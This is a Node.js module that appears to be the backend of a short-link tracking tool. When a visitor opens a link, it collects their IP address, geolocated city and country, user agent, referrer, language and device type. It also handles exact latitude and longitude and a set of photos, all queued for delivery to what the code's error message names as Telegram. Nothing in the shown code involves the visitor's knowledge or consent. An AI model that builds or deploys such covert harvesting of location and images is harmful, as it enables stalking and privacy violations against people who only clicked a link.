const geoip = require("geoip-lite");
const { detectDeviceType } = require("../services/detection.services.js");
const { addDataToQueue, addPhotoToQueue } = require("../services/queue.services.js");

const retreiveUserBasicInfo = async (req, code) => {
    const userAgent = req.get("User-Agent");
    const ipAddress = req.headers["x-forwarded-for"] || req.ip;

    const location = geoip.lookup(ipAddress);
    const referrer = req.get("Referer");
    const language = req.get("Accept-Language");
    const acceptEncoding = req.get("Accept-Encoding");
    const deviceType = detectDeviceType(userAgent);

    const message = `
    🚨 Short URL accessed:- 
    User-Agent: ${userAgent}
    IP Address: ${ipAddress}
    Location: ${location ? location.city + ', ' + location.country : 'Unknown'}
    Referrer: ${referrer || 'None'}
    Language: ${language || 'Not available'}
    Device Type: ${deviceType || 'Unknown'}
    Accept-Encoding: ${acceptEncoding || 'None'}`;

    addDataToQueue({ message, code, userAgent });
}

const retreiveLocation = async (req, lat, lon, userAgent, code) => {
    const ip = req.headers["x-forwarded-for"] || req.ip;
    const message = `📍 *Short URL accessed*\n\n🔹 IP: ${ip}\n🔹 UA: ${userAgent}\n🔹 https://www.latlong.net/c/?lat=${lat}&long=${lon}`;
    addDataToQueue({ message, code, userAgent });
};

const retreivePhotos = async (photos, code, userAgent) => {
    try {
        photos.forEach(photo => {
            addPhotoToQueue({ photo, code, userAgent });
        });
    } catch (err) {
        console.error("Error sending photo to Telegram:", err.message);
    }
};

module.exports = {
    retreiveUserBasicInfo,
    retreiveLocation,
    retreivePhotos
};